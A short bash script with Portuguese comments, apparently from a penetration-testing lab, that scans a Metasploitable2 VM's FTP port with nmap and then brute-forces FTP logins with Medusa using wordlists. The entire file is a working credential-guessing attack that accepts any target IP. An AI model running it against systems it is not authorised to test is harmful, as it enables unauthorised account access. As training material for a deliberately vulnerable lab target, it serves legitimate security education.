#!/usr/bin/env bash
#
# 01_ftp_bruteforce.sh
# Ataque de força bruta ao serviço FTP do Metasploitable2 usando Medusa.
#
# USO:
#   ./01_ftp_bruteforce.sh <IP_DO_METASPLOITABLE>
#
# Pré-requisitos:
#   - Executar dentro da VM Kali Linux
#   - Rede host-only configurada entre Kali e Metasploitable2
#   - Alvo com FTP ativo (porta 21) — confirmar antes com nmap
#
set -euo pipefail

TARGET="${1:?Uso: $0 <IP_DO_ALVO>}"
USERS="../wordlists/usuarios.txt"
PASSWORDS="../wordlists/senhas.txt"

echo "[*] 1) Varredura inicial com nmap para confirmar a porta 21/ftp aberta"
nmap -p 21 -sV "$TARGET"

echo "[*] 2) Executando Medusa contra o serviço FTP"
medusa -h "$TARGET" -U "$USERS" -P "$PASSWORDS" -M ftp -t 3 -f

echo "[*] Concluído. -f faz o Medusa parar no primeiro par usuário/senha válido encontrado."
